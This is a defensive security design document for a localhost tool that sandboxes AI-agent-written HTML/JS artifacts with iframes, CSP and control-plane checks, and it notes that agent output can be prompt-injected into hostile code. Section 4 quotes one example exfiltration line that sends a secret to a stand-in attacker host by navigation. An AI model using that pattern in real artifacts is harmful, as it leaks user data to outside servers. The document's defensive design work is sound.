# Design — Security model (localhost)

> **Scope: localhost-only.** No team/cloud tiers, no separate content domain, no
> per-space subdomains, no accounts. Isolation rests on the sandbox + CSP + a
> control plane that never trusts artifact code. The multi-model review
> (`analysis.md`) drove every correction below.

## 1. Threat model

- **Content author = the agent.** Semi-trusted: acts for the user, but its output
  can be prompt-injected into hostile HTML/JS.
- **Viewer = the user's browser**, the same browser that talks to the Glasspad
  control API on loopback.
- **Deployment: one local user.** But "single user" does **not** mean safe: a
  hostile web page the user also has open can attack `127.0.0.1` via DNS
  rebinding, cross-origin requests, and predictable ports.

Concrete risks if artifact JS is not contained:

1. It calls the Glasspad control API (delete/overwrite a space, read others).
2. It reads anything the app origin holds.
3. It exfiltrates page/user data to an external server.

## 2. What the sandbox does — and does not — do

Every artifact renders in:

```html
<iframe sandbox="allow-scripts allow-top-navigation-by-user-activation" src="/{space}/_c/{slug}"></iframe>
```

`allow-scripts` **without** `allow-same-origin` gives the artifact a **null
origin**. It can run JS (charts, interactivity) but cannot reach the parent
frame, read app storage/cookies, or *read* same-origin API responses.

**Correction (review consensus): the sandbox does NOT block egress.** A
null-origin document can still *send* requests — `fetch`, `sendBeacon`,
`<img>`, WebSocket, form posts — it just can't *read* the responses. So the
sandbox is a DOM/API-object boundary, **not** a network firewall and **not** an
API-authorization boundary. Egress is blocked by CSP (§4); the API is protected
independently (§5).

The **navigation chrome lives in the trusted parent document**; only the artifact
lives in the iframe. This is the pattern Claude's Artifacts use — though note
Artifacts run `allow-same-origin` on a *separate registrable domain*; we
deliberately keep the stricter null-origin form because localhost has no storage/
multi-tenant needs. The path to `allow-scripts allow-same-origin` stays open for
if an artifact later needs storage/workers/same-origin data-fetch.

## 3. Direct-open must also be sandboxed (response-level CSP)

The iframe `sandbox` attribute does nothing if the artifact URL is opened
directly (copied link, new tab). So the **artifact response itself** carries:

```http
Content-Security-Policy: sandbox allow-scripts;
```

A directly-opened `/{space}/_c/{slug}` is then sandboxed by the response, not
just by the framing. Artifacts are served from a dedicated `/{space}/_c/*` route
that exposes **no** mutation endpoints.

## 4. Egress-restricting CSP (the actual exfil boundary)

Artifact responses carry a concrete, tested policy. `'self'` is useless under a
null origin (it matches nothing), so directives **name the explicit host**.
**This is the frozen Phase-1 policy** (implemented in `src/artifact_host/headers.rs`,
proven by `test-security.sh`):

```http
Content-Security-Policy:
  sandbox allow-scripts allow-top-navigation-by-user-activation;
  default-src 'none';
  script-src 'unsafe-inline' 'unsafe-eval' http://127.0.0.1:PORT http://localhost:PORT;
  style-src  'unsafe-inline' http://127.0.0.1:PORT http://localhost:PORT;
  img-src    http://127.0.0.1:PORT http://localhost:PORT data:;
  font-src   http://127.0.0.1:PORT http://localhost:PORT;
  connect-src 'none';            /* Wave 2a widens this to the named host for SSE — never to a foreign host */
  object-src 'none'; frame-src 'none'; worker-src 'none';
  base-uri 'none'; form-action 'none';
  frame-ancestors http://127.0.0.1:PORT http://localhost:PORT;
```

**Both loopback origins are named.** The shell is reachable at `127.0.0.1` *and*
`localhost` (distinct origins to a browser), and the iframe `src` is relative, so
it inherits whichever the user opened. Naming only `127.0.0.1` would make the
browser refuse to frame/run an artifact opened via `localhost`. Both resolve to
the same loopback server, so this widens nothing externally. The control-plane
`host_guard` accepts the same two names and rejects everything else, fail-closed.

### Decision (Phase 1, frozen): `script-src` includes `'unsafe-eval'`

**Verified empirically, not assumed.** The adversarial suite serves the same
artifact twice — once under the frozen policy, once under a strictly-tighter
`?csp=noeval` variant that drops only `'unsafe-eval'` — and observes the
browser:

- **With `'unsafe-eval'`:** `new Function("return 6*7")()` → `42`. Works.
- **Without it:** the identical call throws
  `EvalError: … 'unsafe-eval' is not an allowed source of script …`. Blocked.

Vega-Lite compiles its expression language (filters, calculated fields,
tooltips, signal expressions) with the `Function` constructor, so `gp.chart()`
**cannot render** without `'unsafe-eval'`. It is therefore **frozen into the
artifact `script-src`.**

**Rationale it is acceptable (not a security regression):** the artifact already
runs attacker-controlled inline script under `'unsafe-inline'`; `'unsafe-eval'`
grants it *no new reach*. The containment boundary is not "can it run JS" (it
always can) but **egress + origin isolation**, and those are untouched:
`connect-src 'none'`, the explicit-host allowlist on every fetching directive,
and the null origin all still hold — the suite confirms zero bytes reach the
network canary with `'unsafe-eval'` on. The relaxation lives entirely *inside*
the sandbox. Freezing it here is a settled implementation detail of the design's
pre-authorization ("acceptable inside the sandbox"), not a new trade-off.

Notes / open items resolved during Phase 1:

- Inline JS/CSS require `'unsafe-inline'` (agents write inline) — stated, not
  hidden. Vega-Lite additionally requires `'unsafe-eval'` — **verified and
  frozen in** (above).
- `/_gp/v1/*` needs `Access-Control-Allow-Origin: *` (no credentials) for the
  requests that are CORS-gated (modules, fonts, `fetch` of data); classic
  `<script src>`/`<link>` are not.
- **Self-navigation is more contained than first thought (Phase-1 finding).**
  Fetch directives don't govern navigation, so the concern was that an artifact
  could `location.href = "http://attacker/?"+secret`. But when the artifact is
  **framed by the shell**, the *parent's* `frame-src 'self'` governs the framed
  context's navigations — Chromium **blocks** the framed artifact from navigating
  its iframe to a foreign origin (verified in `test-security.sh`: the network
  canary stays empty). The residual is narrower than stated:
  - A **direct-opened** (top-level) artifact has no parent `frame-src` and *can*
    self-navigate — but it holds no cross-frame secret; it is the agent's own
    content leaking its own data. Mitigated by Wave 4's parent restoring the doc.
  - **User-gesture top navigation** (`allow-top-navigation-by-user-activation`,
    kept for `plan.md §8`'s full-document `target="_top"` cross-nav) remains a
    click-gated channel. Flagged for the PO to weigh — see the terminal report.
- Also set `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`,
  `Cache-Control: no-store` (no stale CSP/nonce), and a `Permissions-Policy`
  deny-list (`camera=(), microphone=(), geolocation=() …`) on artifact + asset
  responses.

## 5. The control plane never trusts the sandbox

The API/CLI control surface (serve/create/reload) is independent of iframe
isolation:

- **Bind loopback only** (`127.0.0.1`); binding `0.0.0.0` requires an explicit
  unsafe flag.
- **Reject `Origin: null`** and unexpected origins; **validate the `Host` header**
  (defeats DNS rebinding).
- No state-mutating `GET`s; a capability token for any mutating control op.
- The artifact-content route (`/{space}/_c/*`) and asset routes expose no
  mutation endpoints at all.

## 6. The parent ↔ iframe bridge

- `bridge.js` (auto-injected into fragment-wrapped artifacts) intercepts clicks
  on same-space **relative** links and `postMessage`s the parent to swap the
  iframe; it also applies the theme (the correct theme is inlined at wrap time to
  avoid FOUC — the bridge only handles later toggles).
- The parent validates **`event.source === iframe.contentWindow`** — not
  `event.origin`, which is the string `"null"` for every sandboxed frame and
  proves nothing. It accepts only a fixed, low-authority schema (navigate-to-
  known-slug resolved against the server's artifact table), bounds slug length
  and message rate, and invalidates bridge state on iframe navigation. A nonce is
  not an auth boundary — artifact JS can read anything injected into it.
- The trusted parent inserts any artifact-derived text (titles, slugs) as **text,
  never `innerHTML`**; enable Trusted Types in the parent CSP.

## 7. Why not keep the sanitizer?

Allowlist sanitizing (`sanitize.rs`) cannot express interactive UIs (no
`<script>`/`<style>`/handlers); widening it to allow scripts defeats it. The
boundary is the **sandbox/CSP**, not tag filtering. Sanitization may survive only
as an optional "static-safe" render mode.

## 8. Layered defenses (localhost)

| Layer | Role |
|---|---|
| Null-origin sandbox iframe | DOM / API-object isolation (not egress, not auth) |
| `CSP: sandbox` response header | Sandboxes direct-opens too |
| Egress CSP (explicit host) | The actual exfiltration boundary |
| Loopback bind + Host/Origin checks + token | Control-plane protection (DNS-rebinding, CSRF) |
| Validated `event.source` bridge | Low-authority parent↔child channel |

## 9. Residual risks (accepted for a local dev tool)

- Iframe self-navigation to an external URL (parent restores expected document).
- Browser-tab DoS from runaway artifact JS — a sandbox is not a resource boundary;
  provide a "stop/reload artifact" control and bound artifact/data sizes.
- A browser sandbox-escape bug — no separate origin locally to contain blast
  radius; acceptable for single-user localhost, and the flip to a separate origin
  is the mitigation if the tool ever grows a shared tier again.
